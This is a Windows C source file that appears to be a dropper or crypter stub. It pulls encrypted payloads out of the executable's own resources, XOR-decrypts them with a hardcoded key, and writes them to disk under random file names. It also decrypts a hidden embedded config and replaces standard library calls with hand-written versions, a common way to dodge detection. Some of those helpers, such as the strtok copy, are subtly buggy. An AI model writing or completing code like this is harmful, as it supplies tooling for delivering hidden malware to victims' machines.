#include <Windows.h>

unsigned short lfsr = 0xACE1u;
unsigned bit;
unsigned pesudo_rand() {
    bit  = ((lfsr >> 0) ^ (lfsr >> 2) ^ (lfsr >> 3) ^ (lfsr >> 5) ) & 1;
    return lfsr =  (lfsr >> 1) | (bit << 15);
}


static char *rand_string(char *str, size_t size)
{
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJK";
    if (size) {
        --size;
        for (size_t n = 0; n < size; n++) {
            int key = pesudo_rand() % (int) (sizeof charset - 1);
            str[n] = charset[key];
        }
        str[size] = '\0';
    }
    return str;
}



// https://en.wikibooks.org/wiki/C_Programming/string.h/strlen
size_t mystrlen(const char * str)
{
	const char *s;
	for (s = str; *s; ++s) {}
	return(s - str);
}
size_t mywstrlen(const wchar_t * str)
{
	const wchar_t *s;
	for (s = str; *s; ++s) {}
	return(s - str);
}
void xor_crypt(char *data,
	int data_len)
{
	const char* key = "0vn203847n298374n28374n9287";

	for (int i = 0; i < data_len; i++)
		data[i] ^= key[i % mystrlen(key)];
}

void myzeromem(char* src, size_t length){
	for(int i = 0; i < length; i++){src[i] = 0;}
}
//https://stackoverflow.com/questions/37132549/implementation-of-strdup-in-c-programming
char *my_strdup(char *src)
{
	char *str;
	char *p;
	int len = 0;

	while (src[len])
		len++;
	str = (char*)VirtualAlloc(NULL, len + 1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	p = str;
	while (*src)
		*p++ = *src++;
	*p = '\0';
	return str;
}

//https://stackoverflow.com/questions/28931379/implementation-of-strtok-function
char* my_strtok(char* s, char* delm)
{
	static int currIndex = 0;
	if (!s || !delm || s[currIndex] == '\0')
		return NULL;
	char *W = (char *)VirtualAlloc(NULL, sizeof(char) * 100, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
	int i = currIndex, k = 0, j = 0;
	//char *ptr;
	//static char *Iterator = s;
	//ptr = s;

	/*if (s == NULL){
	s = Iterator;
	}*/
	while (s[i] != '\0') {
		j = 0;
		while (delm[j] != '\0') {
			if (s[i] != delm[j])
				W[k] = s[i];
			else goto It;
			j++;
		}
		//ptr++;
		i++;
		k++;
	}
It:
	W[i] = 0;
	currIndex = i + 1;
	//Iterator = ++ptr;
	return W;
}

//https://stackoverflow.com/questions/9210528/split-string-with-delimiters-in-c
char** str_split(char* a_str, const char a_delim)
{
	char** result = 0;
	size_t count = 0;
	char* tmp = a_str;
	char* last_comma = 0;
	char delim[2];
	delim[0] = a_delim;
	delim[1] = 0;

	/* Count how many elements will be extracted. */
	while (*tmp)
	{
		if (a_delim == *tmp)
		{
			count++;
			last_comma = tmp;
		}
		tmp++;
	}

	/* Add space for trailing token. */
	count += last_comma < (a_str + mystrlen(a_str) - 1);
	count++;

	result = (char**)VirtualAlloc(NULL, sizeof(char*) * count, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

	if (result)
	{
		size_t idx = 0;
		char* token = my_strtok(a_str, delim);

		while (token)
		{
			*(result + idx++) = my_strdup(token);
			token = my_strtok(0, delim);
		}
		*(result + idx) = 0;
	}

	return result;
}


void * memcpymyas(void* dst, const void* src, unsigned int cnt)
{
	char *pszDest = (char *)dst;

	const char *pszSource = (const char*)src;

	while (cnt) //till cnt
	{
		//Copy byte by byte
		*(pszDest++) = *(pszSource++);
		--cnt;
	}

	return dst;
}
int myAtoi(char* str)
{
	int res = 0; // Initialize result 
	int sign = 1; // Initialize sign as positive 
	int i = 0; // Initialize index of first digit 

	// If number is negative, then update sign 
	if (str[0] == '-') {
		sign = -1;
		i++; // Also update index of first digit 
	}

	// Iterate through all digits and update the result 
	for (; str[i] != '\0'; ++i)
		res = res * 10 + str[i] - '0';

	// Return result with sign 
	return sign * res;
}

char* GetFileFromExe(DWORD* bufSize, int resourceNum)
{
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceNum), RT_RCDATA);
	HGLOBAL hResLoaded = LoadResource(NULL, hRes);
	void* lpBuffer = LockResource(hResLoaded);
	DWORD dwFileSize = SizeofResource(NULL, hRes);
	char* outBuf = (char*)VirtualAlloc(NULL, dwFileSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpymyas(outBuf, lpBuffer, dwFileSize);
	*bufSize = dwFileSize;
	return outBuf;
}

void leakResource(int number) {
	DWORD bufSize;
	int adjusted_index = number+1;
	char* buffer = GetFileFromExe(&bufSize, adjusted_index);
	xor_crypt(buffer, bufSize);
	char file_name[16];
	rand_string(file_name, 8);
	//wsprintfA(newbuf, "file%d.exe", adjusted_index);
	HANDLE hFile = CreateFileA(file_name, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWritten;
	WriteFile(hFile, buffer, bufSize, &dwBytesWritten, 0);
	CloseHandle(hFile);
}


void* readConfig(void){
	DWORD bufSize;
	char* buffer = GetFileFromExe(&bufSize, 9999);
	xor_crypt(buffer, bufSize);
	return buffer;
}